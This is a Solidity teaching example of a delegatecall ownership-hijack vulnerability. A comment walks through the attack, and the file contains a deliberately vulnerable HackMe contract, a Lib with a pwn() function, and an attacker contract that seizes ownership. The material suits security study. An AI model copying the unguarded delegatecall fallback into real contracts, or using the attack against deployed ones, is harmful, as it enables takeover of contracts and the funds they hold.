// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

// delegatecall is tricky to use and wrong usage incorrect understanding can lead to devasting results.
// You must keep 2 things in mind when using delegatecall
// 1. delegatecall preserves context(storage, caller, etc...)
// 2. storage layout must be the same for the contract calling delegatecall and the contract getting called

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the contract
by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deolpys Attack with address of HackMe
4. Eve calls Attack.attack)_
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack()
Attack called the fallback function of HackMe sending the function selector
of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender
Delegatecall runs the code of Lib using the context of HackMe
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

contract Lib {
    address public owner;
    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;
    
    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }

    receive() external payable {

    }
}

contract AttackDelegatecall1 {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}